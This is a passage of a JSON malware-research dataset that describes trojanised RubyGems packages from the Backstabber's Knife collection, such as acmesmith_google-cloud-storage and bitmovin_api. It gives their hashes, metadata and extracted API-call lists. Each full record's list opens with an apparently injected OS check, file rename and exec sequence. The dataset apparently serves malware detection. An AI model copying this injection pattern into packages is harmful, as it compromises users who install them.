            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/acmesmith_google-cloud-storage/0.1.3/acmesmith_google-cloud-storage-0.1.3_extracted/acmesmith_google-cloud-storage-0.1.3_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'attr_reader', '@prefix.end_with?(\"/\").!', '@prefix.end_with?', 'Google::Apis::StorageV1::StorageService.new', '@api.authorization=', 'Google::Auth.get_application_default', 'load_json_key', '@api.authorization=', 'Signet::OAuth2::Client.new', 'credential.[]', 'credential.[]', 'raise', '@api.authorization.fetch_access_token!', '@api.authorization', '@api.get_object', 'bucket', 'account_key_key', 'AccountKey.new', '@api.get_object(bucket, account_key_key, { download_dest: StringIO.new }).string', '@api.get_object', 'bucket', 'account_key_key', 'StringIO.new', 'e.status_code.==', 'e.status_code', 'raise', 'NotExist.new', 'raise', 'get_account_key', 'account_key_exist?', 'raise', 'Google::Apis::StorageV1::Object.new', 'account_key_key', '@api.insert_object', 'bucket', 'StringIO.new', 'key.export', 'cert.export', 'lambda', 'Google::Apis::StorageV1::Object.new', '@api.insert_object', 'bucket', 'StringIO.new', 'put.call', 'certificate_key', 'cert.common_name', 'cert.version', 'h.[](:certificate).rstrip', 'h.[]', 'put.call', 'chain_key', 'cert.common_name', 'cert.version', 'h.[](:chain).rstrip', 'h.[]', 'put.call', 'fullchain_key', 'cert.common_name', 'cert.version', 'h.[](:fullchain).rstrip', 'h.[]', 'put.call', 'private_key_key', 'cert.common_name', 'cert.version', 'h.[](:private_key).rstrip', 'h.[]', '@api.insert_object', 'bucket', 'Google::Apis::StorageV1::Object.new', 'certificate_current_key', 'cert.common_name', 'StringIO.new', 'cert.version', 'version.==', 'certificate_current', 'lambda', '@api.get_object(bucket, key, { download_dest: StringIO.new }).string', '@api.get_object', 'bucket', 'StringIO.new', 'get.call', 'certificate_key', 'get.call', 'chain_key', 'get.call', 'private_key_key', 'Certificate.new', 'e.status_code.==', 'e.status_code', 'raise', 'NotExist.new', 'common_name.inspect', 'raise', 'prefix', 'Regexp.escape', 'loop', '@api.list_objects', 'bucket', 'objects.prefixes', 'list.concat', 'objects.prefixes.map', 'objects.prefixes', '_.sub(certs_prefix_regexp, \"\").sub(/\\\\/.+\\\\z/, \"\").sub', '_.sub(certs_prefix_regexp, \"\").sub', '_.sub', 'objects.next_page_token.nil?', 'objects.next_page_token', 'objects.next_page_token.==', 'objects.next_page_token', 'objects.next_page_token', 'list.uniq', 'prefix', 'Regexp.escape', 'loop', '@api.list_objects', 'bucket', 'objects.prefixes', 'list.concat', 'objects.prefixes.map', 'objects.prefixes', '_.sub(cert_ver_prefix_regexp, \"\").sub(/\\\\/.+\\\\z/, \"\").sub', '_.sub(cert_ver_prefix_regexp, \"\").sub', '_.sub', 'objects.next_page_token.nil?', 'objects.next_page_token', 'objects.next_page_token.==', 'objects.next_page_token', 'objects.next_page_token', 'list.uniq.reject', 'list.uniq', '_.==', 'certificate_current', 'private', 'prefix', 'prefix', 'certificate_base_key', '@api.get_object', 'bucket', 'certificate_current_key', '@api.get_object(bucket, certificate_current_key(cn), { download_dest: StringIO.new }).string.chomp', '@api.get_object(bucket, certificate_current_key(cn), { download_dest: StringIO.new }).string', '@api.get_object', 'bucket', 'certificate_current_key', 'StringIO.new', 'e.status_code.==', 'e.status_code', 'raise', 'NotExist.new', 'cn.inspect', 'raise', 'certificate_base_key', 'certificate_base_key', 'certificate_base_key', 'certificate_base_key', 'JSON.parse', 'File.read', 'obj.[]', 'OpenSSL::PKey.read', 'obj.[]']",
            "n_tokens": 960,
            "embedding": "[-0.00393621 -0.03350946  0.00039333 ...  0.00739962 -0.02519177\n  0.02396156]",
            "cluster": "0",
            "id": 430,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/acmesmith_google-cloud-storage/0.1.3/acmesmith_google-cloud-storage-0.1.3.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/acmesmith_google-cloud-storage/0.1.3/acmesmith_google-cloud-storage-0.1.3_extracted",
            "name": "acmesmith_google-cloud-storage",
            "version": "0.1.3",
            "published_at": "2020-02-18T20:06:46.738Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, rspec, acmesmith, google-api-client",
            "SHA-256": "3e26e86c4ac1345b3579d3278fbdf3dd70fab0b039fc779e3f56742c2c619349"
        },
        {
            "name_version": "bitmovin_api-0.0.4",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/bitmovin_api/0.0.4/bitmovin_api-0.0.4_extracted/bitmovin_api-0.0.4_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'URI', 'Net::HTTP.new', 'API_URI.host', 'API_URI.port', '@@http.use_ssl=', 'API_URI.scheme.==', 'API_URI.scheme', 'Bitmovin.api_key=', 'Bitmovin::Job.create', 'Bitmovin::EncodingProfile.create', 'Bitmovin::Input.create', 'Bitmovin::Output.create', 'Bitmovin::TransferJob.create', 'Bitmovin::EncodingProfile.list', 'Bitmovin::Job.list', 'Bitmovin::Input.list', 'Bitmovin::Output.list', 'require', 'File.expand_path', 'include', 'ATTRIBUTES.each', 'define_method', '@details.[]', 'define_method', '@details.[]=', 'make_create_request', 'new(params).create', 'new', 'reload_details', 'include', 'Net::HTTP::Get.new', 'headers', 'Bitmovin.http.request', 'Bitmovin.http', 'prepare_response_json', 'response.body', 'json.[](:profiles).map', 'json.[]', 'Bitmovin::EncodingProfile.new', 'private', 'Net::HTTP::Get.new', 'encoding_profile_id', 'Bitmovin.http.request', 'Bitmovin.http', 'prepare_response_json', 'response.body', 'prepare_request_json', 'Net::HTTP::Post.new', 'headers', 'post.body=', 'Bitmovin.http.request', 'Bitmovin.http', 'prepare_response_json', 'response.body', 'require', '/^https?:\\\\/\\\\/(.*)\\\\.s3/.freeze', '/^https?:\\\\/\\\\/s3\\\\.amazonaws\\\\.com\\\\/([\\\\w\\\\-\\\\_]+)\\\\//.freeze', '/^https?:\\\\/\\\\/(?:.*)\\\\.s3\\\\.amazonaws\\\\.com\\\\/(.*)/.freeze', '/^https?:\\\\/\\\\/s3\\\\.amazonaws\\\\.com\\\\/[\\\\w\\\\-\\\\_]+\\\\/(.*)/.freeze', 'deep_camelize_keys', 'JSON.generate', 'JSON.parse', 'json.is_a?', 'deep_underscore_keys', 'json.is_a?', 'json.map', 'deep_underscore_keys', 'Hash.new', 'subject.inject', 'acc.[]=', 'camelize(props.first.to_s, first_letter_in_uppercase).to_sym', 'camelize', 'props.first.to_s', 'props.first', 'props.last', 'deep_camelize_keys', 'props.last', 'props.last.map', 'props.last', 'i.is_a?', 'deep_camelize_keys', 'props.last', 'subject.is_a?', 'subject.is_a?', 'subject.class.new', 'subject.class', 'subject.inject', 'acc.[]=', 'underscore(props.first.to_s).to_sym', 'underscore', 'props.first.to_s', 'props.first', 'props.last', 'deep_underscore_keys', 'props.last', 'props.last.map', 'props.last', 'i.is_a?', 'deep_underscore_keys', 'props.last', 'URI.unescape', 'unescaped.match(S3_BUCKET_SUBDOMAIN_REGEX).[]', 'unescaped.match', 'unescaped.match(S3_BUCKET_IN_URL_REGEX).[]', 'unescaped.match', 'URI.unescape', 'unescaped.match(S3_OBJECT_KEY_SUBDOMAIN_REGEX).[]', 'unescaped.match', 'unescaped.match(S3_OBJECT_KEY_IN_URL_REGEX).[]', 'unescaped.match', 'protected', 'Bitmovin.api_key', 'lower_case_and_underscored_word.to_s.gsub(/\\\\/(.?)/) {\\n  \"::\" + $1.upcase\\n}.gsub', 'lower_case_and_underscored_word.to_s.gsub', 'lower_case_and_underscored_word.to_s', '\"::\".+', '$1.upcase', '$2.upcase', 'lower_case_and_underscored_word.[](0).+', 'lower_case_and_underscored_word.[]', 'camelize(lower_case_and_underscored_word).[]', 'camelize', 'str.gsub', '$&.downcase', 'require', 'File.expand_path', 'include', 'ATTRIBUTES.each', 'define_method', '@params.[]', 'define_method', '@params.[]=', 'attr_reader', 'args.pop', 'args.length.==', 'args.length', 'args.pop', '@params.[](:bucket).!', '@params.[]', '@params.[](:type).==', '@params.[]', '@params.[]=', 'extract_bucket', 'url', '@params.[](:object_key).!', '@params.[]', '@params.[](:type).==', '@params.[]', '@params.[]=', 'extract_object_key', 'url', '@params.[]', 'new(*args).create', 'new', 'make_create_request', 'reload.!', 'reload_details', 'include', 'instance_variable_get', 'reload.!', 'Net::HTTP::Get.new', 'headers', 'Bitmovin.http.request', 'Bitmovin.http', 'prepare_response_json(response.body).map', 'prepare_response_json', 'response.body', 'Bitmovin::Input.new', 'instance_variable_set', 'private', '[\"s3\", \"gcs\"].include?', 'params.[]', 'params', 'params.[]', 'params', 'raise', 'Bitmovin::ApiParameterEmptyError.new', 'params.[]', 'params', 'raise', 'Bitmovin::ApiParameterEmptyError.new', 'prepare_request_json', 'params', 'params.[]', 'params', 'Net::HTTP::Post.new', 'headers', 'post.body=', 'Bitmovin.http.request', 'Bitmovin.http', 'prepare_response_json', 'response.body', 'Net::HTTP::Get.new', '@params.[]', 'headers', 'Bitmovin.http.request', 'Bitmovin.http', 'prepare_response_json', 'response.body', 'require', 'File.expand_path', 'include', 'ATTRIBUTES.each', 'define_method', '@details.[]', 'define_method', '@details.[]=', 'new(params).create', 'new', 'make_create_request', 'reload_details', 'reload.!', 'reload_status', 'reload.!', 'reload_manifest', 'include', 'instance_variable_get', 'reload.!', 'Net::HTTP::Get.new', 'headers', 'Bitmovin.http.request', 'Bitmovin.http', 'prepare_response_json', 'response.body', 'json.[](:jobs).map', 'json.[]', 'Bitmovin::Job.new', 'instance_variable_set', 'private', 'Net::HTTP::Get.new', '@details.[]', 'headers', 'Bitmovin.http.request', 'Bitmovin.http', 'prepare_response_json', 'response.body', 'Net::HTTP::Get.new', '@details.[]', 'headers', 'Bitmovin.http.request', 'Bitmovin.http', 'prepare_response_json', 'response.body', 'Net::HTTP::Get.new', '@details.[]', 'headers', 'Bitmovin.http.request', 'Bitmovin.http', 'prepare_response_json', 'response.body', 'prepare_request_json', 'Net::HTTP::Post.new', 'headers', 'post.body=', 'Bitmovin.http.request', 'Bitmovin.http', 'prepare_response_json', 'response.body', 'require', 'File.expand_path', 'include', 'ATTRIBUTES.each', 'define_method', '@details.[]', 'define_method', '@details.[]=', 'new(params).create', 'new', 'make_create_request', 'reload.!', 'reload_details', 'include', 'instance_variable_get', 'reload.!', 'Net::HTTP::Get.new', 'headers', 'Bitmovin.http.request', 'Bitmovin.http', 'prepare_response_json(response.body).map', 'prepare_response_json', 'response.body', 'Bitmovin::Output.new', 'instance_variable_set', 'private', '[\"s3\", \"gcs\"].include?', '@details.[]', '@details.[]', 'raise', 'Bitmovin::ApiParameterEmptyError.new', '@details.[]', 'raise', 'Bitmovin::ApiParameterEmptyError.new', 'prepare_request_json', 'Net::HTTP::Post.new', 'headers', 'post.body=', 'Bitmovin.http.request', 'Bitmovin.http', 'prepare_response_json', 'response.body', 'Net::HTTP::Get.new', '@params.[]', 'headers', 'Bitmovin.http.request', 'Bitmovin.http', 'prepare_response_json', 'response.body', 'require', 'File.expand_path', 'include', 'ATTRIBUTES.each', 'define_method', '@details.[]', 'define_method', '@details.[]=', 'new(params).create', 'new', 'make_create_request', 'include', 'relaod.!', 'relaod', 'Net::HTTP::Get.new', '@details.[]', 'headers', 'Bitmovin.http.request', 'Bitmovin.http', 'prepare_response_json', 'response.body', 'json.[](:jobs).map', 'json.[]', 'Bitmovin::TransferJob.new', 'private', 'prepare_request_json', 'Net::HTTP::Post.new', 'headers', 'post.body=', 'Bitmovin.http.request', 'Bitmovin.http', 'puts', 'prepare_response_json', 'response.body', 'require', 'OptionParser.new { |opts,|\\n  opts.banner=\"Usage: bitmovin [options]\"\\n  opts.on(\"-k\", \"--key\", \"api key\") { |key,|\\n    options.[]=(:key, key)\\n  }\\n}.parse!', 'OptionParser.new', 'opts.banner=', 'opts.on', 'options.[]=', 'p', 'p']",
            "n_tokens": 2091,
            "embedding": "[ 0.00712772 -0.00843509 -0.00504338 ...  0.00736966 -0.0296089\n  0.02400721]",
            "cluster": "0",
            "id": 730,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/bitmovin_api/0.0.4/bitmovin_api-0.0.4.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/bitmovin_api/0.0.4/bitmovin_api-0.0.4_extracted",
            "name": "bitmovin_api",
            "version": "0.0.4",
            "published_at": "2020-02-18T23:35:23.790Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "yard, rake, byebug, guard, guard-minitest, apib-mock_server, webmock, minitest-color",
            "SHA-256": "119d300b565273762927116d0631b1d5e5e334ccee2b270f1d70edff97d37063"
        },
        {
            "name_version": "galvinhsiu-active-cart-0.0.20",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/galvinhsiu-active-cart/0.0.20/galvinhsiu-active-cart-0.0.20_extracted/galvinhsiu-active-cart-0.0.20_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', '$:.unshift', 'File.join', 'File.dirname', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'File.exist?', 'File.read', 'attr_accessor', 'include', 'OrderTotalCollection.new', 'block_given?', 'order_total_calculators', 'extend', 'def_delegators', '@storage_engine.invoice_id', '@storage_engine.quantity', '@storage_engine.sub_total', 'with_callbacks', '@storage_engine.add_to_cart', '@storage_engine.include?', '@storage_engine.index', 'quantity.-', '@storage_engine.at(index).quantity', '@storage_engine.at', 'diff.<', 'remove_from_cart', '-1.*', 'add_to_cart', 'add_to_cart', 'with_callbacks', '@storage_engine.remove_from_cart', 'sub_total.+', 'sub_total', 'order_total_calculators.total', 'order_total_calculators', 'storage_engine.state', 'storage_engine', '@storage_engine.state_paths.events.include?', '@storage_engine.state_paths.events', '@storage_engine.state_paths', 'symbol.to_s.[](0..-2).to_sym', 'symbol.to_s.[]', 'symbol.to_s', '@storage_engine.send', 'private', 'item.respond_to?', '\"before_#{type}\".to_sym', 'item.send', '\"before_#{type}\".to_sym', '@storage_engine.respond_to?', '\"before_#{type}\".to_sym', '@storage_engine.send', '\"before_#{type}\".to_sym', '@storage_engine.respond_to?', '\"after_#{type}\".to_sym', '@storage_engine.send', '\"after_#{type}\".to_sym', 'item.respond_to?', '\"after_#{type}\".to_sym', 'item.send', '\"after_#{type}\".to_sym', 'base.state_machine', 'event', 'transition', 'event', 'transition', 'event', 'transition', 'event', 'transition', 'event', 'transition', 'state', 'state', 'state', 'state', 'state', 'raise', 'inject', 't.+', 'item.quantity.*', 'item.quantity', 'item.price.to_f', 'item.price', 'inject', 't.+', 'item.quantity', 'self.include?', 'self.index', 'self.at(index).quantity', 'self.at', 'item.quantity', 'self.<<', 'self.include?', 'self.index', 'quantity.==', 'self.at(index).quantity', 'self.at', '(existing = self.at(index)).quantity - quantity.>', '(existing = self.at(index)).quantity.-', '(existing = self.at(index))\\n.quantity', 'self.at', 'existing.quantity=', 'existing.quantity.-', 'existing.quantity', 'self.delete_at', 'raise', 'raise', 'raise', 'attr_accessor', 'include', 'self.id.==', 'self.id', 'item.id', 'raise', 'raise', 'seed.each', 'self.push', 'OrderTotalCollection.new', 'self.each', 'tmp.<<', 'order_total_collection.each', 'tmp.<<', 'items.reverse.each', 'items.reverse', 'self.insert', 'items.each_with_index', 'self.insert', 'index + i.+', 'index.+', 'self.delete_at', 'self.insert', 'self.inject', 't.+', 'calculator.active?', 'calculator.price', 'include', '@@last_id.+']",
            "n_tokens": 741,
            "embedding": "[-0.01941152  0.00600469 -0.00151787 ... -0.00353175 -0.01640679\n  0.00516528]",
            "cluster": "0",
            "id": 351,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/galvinhsiu-active-cart/0.0.20/galvinhsiu-active-cart-0.0.20.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/galvinhsiu-active-cart/0.0.20/galvinhsiu-active-cart-0.0.20_extracted",
            "name": "galvinhsiu-active-cart",
            "version": "0.0.20",
            "published_at": "2020-02-18T23:40:09.149Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "shoulda, mocha, machinist, faker, state_machine",
            "SHA-256": "a5195c0cbf97c29e1de4c9b233b317c4cffdf5d0901fee6ba9272a5fac589232"
        },
        {
            "name_version": "jmcnevin-rghost-barcode-0.8.8",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/jmcnevin-rghost-barcode/0.8.8/jmcnevin-rghost-barcode-0.8.8_extracted/jmcnevin-rghost-barcode-0.8.8_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'RGhost::Config::GS.[](:extensions).<<', 'RGhost::Config::GS.[]', 'File.join', 'File.dirname', 'RGhost::Config::GS.[](:preload).<<', 'RGhost::Config::GS.[]', 'set', 'RGhost::Barcode::Isbn.new', 'set', 'RGhost::Barcode::Code11.new', 'set', 'RGhost::Barcode::Code2of5.new', 'set', 'RGhost::Barcode::Ean8.new', 'set', 'RGhost::Barcode::Postnet.new', 'set', 'RGhost::Barcode::Rssexpanded.new', 'set', 'RGhost::Barcode::Auspost.new', 'set', 'RGhost::Barcode::Code39.new', 'set', 'RGhost::Barcode::Upce.new', 'set', 'RGhost::Barcode::Azteccode.new', 'set', 'RGhost::Barcode::Ean5.new', 'set', 'RGhost::Barcode::Plessey.new', 'set', 'RGhost::Barcode::Raw.new', 'set', 'RGhost::Barcode::Rss14.new', 'set', 'RGhost::Barcode::Royalmail.new', 'set', 'RGhost::Barcode::Datamatrix.new', 'set', 'RGhost::Barcode::Code128.new', 'set', 'RGhost::Barcode::Upca.new', 'set', 'RGhost::Barcode::Qrcode.new', 'set', 'RGhost::Barcode::Maxicode.new', 'set', 'RGhost::Barcode::Rationalizedcodabar.new', 'set', 'RGhost::Barcode::Code93.new', 'set', 'RGhost::Barcode::Msi.new', 'set', 'RGhost::Barcode::Rsslimited.new', 'set', 'RGhost::Barcode::Ean13.new', 'set', 'RGhost::Barcode::Onecode.new', 'set', 'RGhost::Barcode::Ean2.new', 'set', 'RGhost::Barcode::Interleaved2of5.new', 'set', 'RGhost::Barcode::Symbol.new', 'set', 'RGhost::Barcode::Pdf417.new', 'set', 'RGhost::Barcode::Kix.new', 'set', 'RGhost::Barcode::Pharmacode.new', 'RGhost::Document.new', 'd.define_template', 'File.join', 'File.dirname', 'd.before_page_create', 'use_template', 'RGhost::Config::BARCODE_EXAMPLES.each', 'd.show', 'd.jump_rows', 'v.[]', 'd.send', '\"barcode_#{k}\".to_sym', 'v.[]', 'opt.dup', 'd.jump_rows', 'd.show', 'v.[]', 'd.next_row', 'd.text', 'opt.inspect', 'd.next_page', 'd.text', 'd.next_row', 'd.show', 'd.next_row', 'd.show', 'make', '@params.join', '@params.<<', 'add', 'value.to_s.gsub', 'value.to_s', '@params.<<', 'RGhost::Config::GS.[](:unit).==', 'RGhost::Config::GS.[]', 'value.to_f./', 'value.to_f', 'add', 'self.class', 'map', 'map', 'add_single', '@options.each', 'value.each', 'add_single', 'add', 'value.[]', 'add', 'value.[]', 'add_color', 'add', 'add', '@options.each', 'add', 'key.to_s.gsub', 'key.to_s', 'add_single', 'add', '@options.each', 'add_color', 'add_single', 'add', 'attr_reader', 'options.dup', '@options.[]', '@options.[]', 'RGhost::Barcode::Text.new', '@options.[]', 'RGhost::Barcode::Guard.new', '@options.[]', 'RGhost::Barcode::Border.new', '@options.[]', 'RGhost::Cursor.translate', 'RGhost::Cursor.rotate', '@options.[]', '@options.[]', 'RGhost::Scale.new', '@options.[](:scale).[]', '@options.[]', '@options.[](:scale).[]', '@options.[]', '[:scale, :enable, :text, :guard, :border, :x, :y, :rotate].each', '@options.delete', 'self.class.to_s.downcase.split(/::/).last', 'self.class.to_s.downcase.split', 'self.class.to_s.downcase', 'self.class.to_s', 'self.class', '[:x, :y].each', '@options.delete', '@options.each', 'add_color', 'add_color', 'add_with_unit', 'add', '[@text.map, @border.map, @guard.map, self.map].join', '@text.map', '@border.map', '@guard.map', 'self.map', '@point.ps', '[MAJOR, MINOR, TINY].join']",
            "n_tokens": 1105,
            "embedding": "[ 0.03105702 -0.03018271 -0.00891416 ... -0.01370386 -0.01394145\n  0.03208338]",
            "cluster": "0",
            "id": 486,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/jmcnevin-rghost-barcode/0.8.8/jmcnevin-rghost-barcode-0.8.8.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/jmcnevin-rghost-barcode/0.8.8/jmcnevin-rghost-barcode-0.8.8_extracted",
            "name": "jmcnevin-rghost-barcode",
            "version": "0.8.8",
            "published_at": "2020-02-18T23:43:35.731Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "rghost",
            "SHA-256": "cf0b46b0d5c2181e039e7d1749d0710b8db4449c3ef108aafa701b0953445be6"
        },
        {
            "name_version": "aastra-xml_api-1.1.4",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aastra-xml_api/1.1.4/aastra-xml_api-1.1.4_extracted/aastra-xml_api-1.1.4_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', '[\"version\", \"array_extensions\", \"phone\", \"phone_configuration\", \"phone_configuration_entry\", \"phone_directory\", \"phone_directory_entry\", \"phone_execute\", \"phone_execute_entry\", \"phone_formatted_text_screen\", \"phone_formatted_text_screen_entry\", \"phone_icon_entry\", \"phone_image_menu\", \"phone_image_menu_entry\", \"phone_image_screen\", \"phone_input_screen\", \"phone_input_screen_entry\", \"phone_softkey_entry\", \"phone_status\", \"phone_status_entry\", \"phone_text_menu\", \"phone_text_menu_entry\", \"phone_text_screen\"].each', 'require', 'self.sort', 'str1.match', 'str2.match', '[a, b].include?', 'str1.<=>', '(comp = a.pre_match <=> b.pre_match)\\n.==', 'a.pre_match.<=>', 'a.pre_match', 'b.pre_match', 'a.[](0).==', 'a.[]', 'b.[]', 'a.[](0) + a.post_match.<=>', 'a.[](0).+', 'a.[]', 'a.post_match', 'b.[](0).+', 'b.[]', 'b.post_match', 'a.[](0).to_i.<=>', 'a.[](0).to_i', 'a.[]', 'b.[](0).to_i', 'b.[]', 'a.post_match', 'b.post_match', 'str1.match', 'str2.match', 'self.replace', 'natsort', 'PhoneSoftkeyEntry.new', 'escape', 'escape', 'PhoneIconEntry.new', 's.nil?', 'CGI.escapeHTML', 's.each', 'HIGHASCII.[](char).nil?.!', 'HIGHASCII.[](char).nil?', 'HIGHASCII.[]', 'HIGHASCII.[]', 'PhoneConfigurationEntry.new', '@beep.==', '@triggerDestroyOnExit.==', '@entries.each', 'entry.render', 'escape', 'escape', 'PhoneDirectoryEntry.new', '@entries.size.-', '@entries.size', '@entries.[](i).getName', '@entries.[]', 'linklist.[]=', '@entries.[](i).getName', '@entries.[]', 'tmparray.extend', 'tmparray.natsort!', 'tmparray.each', '@entries.[]', 'linklist.[]', '@previous.nil?.!', '@previous.nil?', 'escape', '@next.nil?.!', '@next.nil?', 'escape', '@destroyOnExit.==', '@cancelAction.nil?.!', '@cancelAction.nil?', 'escape', '@beep.==', '@lockin.==', '@timeout.!=', '@title.nil?.!', '@title.nil?', 'escape', '@title_wrap.==', '@entries.each', 'index.<', 'entry.render', '@softkeys.each', 'softkey.render', 'escape', 'escape', 'PhoneExecuteEntry.new', 'escape', '@beep.==', '@triggerDestroyOnExit.==', '@entries.each', 'entry.render', 'escape', '@interruptCall.==', 'PhoneFormattedTextScreenEntry.new', 'PhoneFormattedTextScreenEntry.new', 'PhoneFormattedTextScreenEntry.new', '@destroyOnExit.==', '@cancelAction.nil?.!', '@cancelAction.nil?', 'escape', '@doneAction.nil?.!', '@doneAction.nil?', 'escape', '@beep.==', '@lockin.==', '@allowAnswer.==', '@timeout.!=', '@allowDTMF.==', 'yes', '@entries.each', 'entry.render', '@softkeys.each', 'softkey.render', '@icons.each', 'iconList.==', 'icon.render', 'iconList.!=', 'size.==', 'convert_high_ascii', '@size.nil?.!', '@size.nil?', '@align.nil?.!', '@align.nil?', 'escape', '@size.nil?.!', '@size.nil?', 'require', 'GD::Image.new', '@img.colorAllocate', '@img.colorAllocate', 'RUBY_PLATFORM.downcase', 'os.scan(/win/).nil?.!', 'os.scan(/win/).nil?', 'os.scan', 'os.scan(/linux$/).nil?.!', 'os.scan(/linux$/).nil?', 'os.scan', 'os.scan(/darwin\\\\d+\\\\.\\\\d+$/).nil?.!', 'os.scan(/darwin\\\\d+\\\\.\\\\d+$/).nil?', 'os.scan', 'ENV.[]=', 'ENV.[]=', '@img.stringTTF', 'getColor', '@img.string', 'getColor', '@img.filledRectangle', 'getColor', '@img.rectangle', 'getColor', '@img.filledEllipse', 'getColor', '@img.ellipse', 'getColor', '@img.dashedLine', 'getColor', '@img.line', 'getColor', 'index.==', 'PhoneImageMenuEntry.new', 'gdImage.getGDImage', 'img.getPixel', 'rgb.>', '2.**', '7.-', 'i.%', '(i % 8)\\n.==', 'i.%', '\"%02x\".%', 'setImage', 'setSize', 'escape', '@destroyOnExit.==', '@cancelAction.nil?.!', '@cancelAction.nil?', 'escape', '@beep.==', '@locking.==', '@timeout.!=', '@verticalAlign.nil?.!', '@verticalAlign.nil?', '@horizontalAlign.nil?.!', '@horizontalAlign.nil?', '@height.nil?.!', '@height.nil?', '@width.nil?.!', '@width.nil?', '@uriBase.nil?.!', '@uriBase.nil?', 'escape', '@entries.each', 'entry.render', '@softkeys.each', 'softkey.render', '@icons.each', 'iconList.==', 'icon.render', 'iconList.!=', 'escape', 'gdImage.getGDImage', 'img.getPixel', 'rgb.>', '2.**', '7.-', 'i.%', '(i % 8)\\n.==', 'i.%', '\"%02x\".%', 'setImage', 'setSize', '@destroyOnExit.==', '@cancelAction.nil?.!', '@cancelAction.nil?', 'escape', '@beep.==', '@locking.==', '@timeout.!=', '@allowDTMF.==', '@verticalAlign.nil?.!', '@verticalAlign.nil?', '@horizontalAlign.nil?.!', '@horizontalAlign.nil?', '@height.nil?.!', '@height.nil?', '@width.nil?.!', '@width.nil?', '@softkeys.each', 'softkey.render', '@icons.each', 'iconList.==', 'icon.render', 'iconList.!=', 'PhoneInputScreenEntry.new', '@entries.[](@entries.size - 1).setType', '@entries.[]', '@entries.size.-', '@entries.size', '@entries.[](@entries.size - 1).setPassword', '@entries.[]', '@entries.size.-', '@entries.size', '@entries.[](@entries.size - 1).setEditable', '@entries.[]', '@entries.size.-', '@entries.size', '@entries.[](@entries.size - 1).setParameter', '@entries.[]', '@entries.size.-', '@entries.size', '@entries.[](@entries.size - 1).setPrompt', '@entries.[]', '@entries.size.-', '@entries.size', '@entries.[](@entries.size - 1).setDefault', '@entries.[]', '@entries.size.-', '@entries.size', '@entries.[](@entries.size - 1).setSelection', '@entries.[]', '@entries.size.-', '@entries.size', '@entries.[](@entries.size - 1).addSoftkey', '@entries.[]', '@entries.size.-', '@entries.size', '@type.nil?', '@password.==', '@destroyOnExit.==', '@cancelAction.nil?.!', '@cancelAction.nil?', 'escape', '@editable.==', '@beep.==', '@defaultindex.nil?.!', '@defaultindex.nil?', '@inputlanguage.nil?.!', '@inputlanguage.nil?', '@displaymode.nil?.!', '@displaymode.nil?', '@lockin.==', '@allowAnswer.==', '@timeout.!=', '@title.nil?.!', '@title.nil?', '@title_wrap.==', 'escape', '@prompt.nil?.!', '@prompt.nil?', 'escape', 'escape', '@parameter.nil?.!', '@parameter.nil?', '@entries.each', 'entry.render', '@softkeys.each', 'softkey.render', '@icons.each', 'iconList.==', 'icon.render', 'iconList.!=', 'PhoneSoftkeyEntry.new', '@type.nil?.!', '@type.nil?', '@password.==', '@editable.==', '@prompt.nil?.!', '@prompt.nil?', '@parameter.nil?.!', '@parameter.nil?', '@selection.nil?.!', '@selection.nil?', '@default.nil?.!', '@default.nil?', '@softkeys.each', 'softkey.render', '@icon.nil?.!', '@icon.nil?', 'PhoneStatusEntry.new', '@beep.==', '@triggerDestroyOnExit.==', '@entries.each', 'entry.render', 'setType', 'type.nil?', 'type.nil?.!', 'type.nil?', 'escape', '@type.nil?.!', '@type.nil?', 'escape', '@timeout.nil?.!', '@timeout.nil?', 'escape', 'PhoneTextMenuEntry.new', '@entries.size.-', '@entries.size', '@entries.[](i).getName', '@entries.[]', 'linklist.[]=', '@entries.[](i).getName', '@entries.[]', 'tmparray.extend', 'tmparray.natsort!', 'tmparray.each', '@entries.[]', 'linklist.[]', '@maxitems.nil?', 